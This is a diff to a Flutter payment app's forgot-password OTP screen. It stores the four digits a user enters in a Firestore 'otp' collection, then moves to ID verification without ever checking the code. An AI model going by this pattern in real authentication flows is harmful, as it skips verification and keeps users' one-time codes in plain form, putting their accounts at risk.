@@ -1,9 +1,57 @@
+import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:mo_pay/forgot_password/id_verify.dart';
 
-class OtpVerify extends StatelessWidget {
+class OtpVerify extends StatefulWidget {
   const OtpVerify({super.key});
+
+  @override
+  State<OtpVerify> createState() => _OtpVerifyState();
+}
+
+class _OtpVerifyState extends State<OtpVerify> {
+
+  final TextEditingController _controller1 = TextEditingController();
+  final TextEditingController _controller2 = TextEditingController();
+  final TextEditingController _controller3 = TextEditingController();
+  final TextEditingController _controller4 = TextEditingController();
+
+  bool saving = false;
+
+  @override
+  void dispose() {
+    _controller1.dispose();
+    _controller2.dispose();
+    _controller3.dispose();
+    _controller4.dispose();
+    super.dispose();
+  }
+
+  Future<void> _save() async {
+    setState(() {
+      saving = true;
+    });
+    try {
+      if (
+        _controller1.text.trim().isNotEmpty&&
+        _controller2.text.trim().isNotEmpty&&
+        _controller3.text.trim().isNotEmpty&&
+        _controller4.text.trim().isNotEmpty
+      ) {
+        await FirebaseFirestore.instance.collection('otp').add({
+          'OTP': ('${_controller1.text.trim()}${_controller2.text.trim()}${_controller3.text.trim()}${_controller4.text.trim()}'),
+          'createdAt': FieldValue.serverTimestamp(),
+        });
+      }
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        SnackBar(content: Text('Failed $e'))
+      );
+    } finally {
+      if (mounted) {setState(() => saving = false);}
+    }
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -115,22 +163,22 @@ class OtpVerify extends StatelessWidget {
                         SizedBox(
                           height: 56,
                           width: 46,
-                          child: OtpField()
+                          child: OtpField(controller: _controller1,)
                         ),
                         SizedBox(
                           height: 56,
                           width: 46,
-                          child: OtpField()
+                          child: OtpField(controller: _controller2)
                         ),
                         SizedBox(
                           height: 56,
                           width: 46,
-                          child: OtpField()
+                          child: OtpField(controller: _controller3)
                         ),
                         SizedBox(
                           height: 56,
                           width: 46,
-                          child: OtpField(),
+                          child: OtpField(controller: _controller4),
                         ),
                       ],
                     ),
@@ -155,12 +203,15 @@ class OtpVerify extends StatelessWidget {
                   ),
                   SizedBox(height: 150,),
                   GestureDetector(
-                    onTap: () {
-                      Navigator.of(context).push(
-                        MaterialPageRoute(
-                          builder: (context) => const IdVerify(),
-                        )
-                      );
+                    onTap: () async {
+                      if (!saving) {
+                        await _save();
+                        Navigator.of(context).push(
+                          MaterialPageRoute(
+                            builder: (context) => const IdVerify(),
+                          )
+                        );
+                      }
                     },
                     child: Container(
                       height: 56,
@@ -191,15 +242,22 @@ class OtpVerify extends StatelessWidget {
 }
 
 class OtpField extends StatelessWidget {
+ final TextEditingController controller; 
   const OtpField({
+    required  this.controller,
     super.key,
   });
 
   @override
   Widget build(BuildContext context) {
     return TextField(
+      controller: controller,
       maxLength: 1,
       maxLengthEnforcement: MaxLengthEnforcement.enforced,
+      textInputAction: TextInputAction.next,
+      onChanged: (value) {
+        if (value.isNotEmpty) FocusScope.of(context).nextFocus();
+      },
       buildCounter: (context, {required currentLength, required isFocused, required maxLength}) => SizedBox(),
       decoration: InputDecoration(
         border: OutlineInputBorder(
